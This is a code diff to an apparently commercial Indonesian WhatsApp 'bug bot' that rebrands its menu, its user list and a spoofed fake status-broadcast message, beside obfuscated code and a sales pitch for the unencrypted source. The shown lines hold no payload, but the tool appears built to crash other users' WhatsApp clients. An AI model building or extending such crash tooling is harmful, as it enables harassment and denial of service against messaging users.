@@ -123,12 +123,12 @@ if (command) {
 lexx.readMessages([msg.key])
 }
 
-let fakenya = {key : {participant : '0@s.whatsapp.net', ...(msg.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `LexBotzz...🌷`, jpegThumbnail: fs.readFileSync('./lib/logo.jpg')}}}
+let fakenya = {key : {participant : '0@s.whatsapp.net', ...(msg.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `FORBIDDEN 404`, jpegThumbnail: fs.readFileSync('./lib/logo.jpg')}}}
 
 switch (command) {
 case 'menu':{
 let ownerNya = setting.ownerNumber
-menu =`═════[ BUG FORBIDDEN404 ]═════
+menu =`[ BUG FORBIDDEN 404 ]
 
 ${ucapanWaktu} @${sender.split('@')[0]}
 
@@ -332,7 +332,7 @@ msg.reply(respon)
 break
 case 'listusr':{
 if (!isCreator) return msg.reply(`sorry anda sepertinya bukan pemilik bot`)
-let listusr =`*List user bug ROBOTKUPINTAR*\n\ntotal user : ${owner.length}\n`
+let listusr =`*LIST USER BUG ROBOTKUPINTAR*\n\ntotal user : ${owner.length}\n`
 var no = 1
 for (let x of owner) {
 listusr +=`\nUser: ${no++}\nID: ${x}\n\n`
@@ -387,7 +387,7 @@ const _0x4f5076=_0x49b8;(function(_0x568ec2,_0x4e4737){const _0xf4bbda=_0x49b8,_
 }
 break
 
-// DISARANKAN BOT MAKE WA GB BIAR GAK CRASH
+// DISARANKAN INI ADALAH BUG BOT WAR DARI INDONESIA 🇲🇨
 
 // BUY NO ENC 100%? CHAT ADMIN
 // HARGA? ORI 120K PROMO BULAN JANUARI JADI 75K
